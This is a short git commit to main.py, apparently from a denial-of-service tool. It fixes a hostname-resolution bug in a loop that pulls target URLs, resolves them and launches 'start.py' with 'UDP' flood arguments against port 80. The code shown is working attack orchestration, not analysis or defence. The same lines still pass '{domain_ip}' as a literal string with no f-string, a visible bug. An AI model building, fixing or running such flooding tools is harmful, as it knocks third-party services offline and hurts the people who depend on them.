8d60f83dfb1270ee62afbca6c0623233704e3778
ignitedevua <ignitedevua@gmail.com>
2022-03-04 16:34:34 +0200

    update

--- main.py
+++ main.py
@@ -37,7 +37,7 @@ async def start_operation():
     while True:
         try:
             url = dataProvider.get_url()
-            domain_ip = socket.gethostbyname({url})
+            domain_ip = socket.gethostbyname(url)
             logger.info(f'URL {url}:{domain_ip}')
             process = await asyncio.create_subprocess_exec( "python3", 
             "start.py", "UDP", "{domain_ip}:80", "1", "1000", "true", 
